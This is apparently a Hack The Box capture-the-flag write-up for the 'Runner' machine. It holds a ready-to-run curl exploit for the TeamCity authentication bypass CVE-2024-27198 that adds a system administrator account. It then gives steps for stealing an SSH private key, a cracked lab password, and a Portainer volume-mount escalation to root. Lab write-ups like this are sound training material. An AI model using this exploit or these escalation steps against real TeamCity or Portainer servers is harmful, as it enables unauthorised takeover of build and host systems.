# Runner

## Info

Runner is a medium difficulty linux machine from hack the box.

## Nmap

Tcp ports open.

```
22
80
8000
```

## HTTP 80

The web page states it uses TeamCity to power ci cd.

The following subdomain is found in the wordlist.

```
teamcity
```

```
/home/kali/wordlists/Subdomains/bug-bounty-program-subdomains-trickest-inventory.txt
```

The following cve was found by Rapid7 to allow a admin user to be added.

```
CVE-2024-27198
```

Using curl, add an admin user haxor and password haxor.

```
curl -ik 'http://runner.htb/hax?jsp=/app/rest/users;.jsp' -X POST -H "Content-Type: application/json" -H "Host: teamcity.runner.htb" --data "{\"username\": \"haxor\", \"password\": \"haxor\", \"email\": \"haxor\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}" 
```

## User

When browsing the projects, I see a ssh key added by john.

In administrator, global settings, click on browse, this allows the database to be seen.

Go to the following to download the private ssh key for john.

```
config/projects/AllProjects/pluginData/ssh_keys/id_rsa
```

## Root

There is a backup option on the teamcity web ui, download the zip and look at database dump table users.

Cracked matthew password

```
piper123
```

Running on localhost is portainer, sign in as matthew.

create a volume, all the following to the local driver.

```
type ext4
device /dev/sda2
o uid=0
```

Then create the container with the ubuntu image.

Access the file system in the container where the volume was mounted.
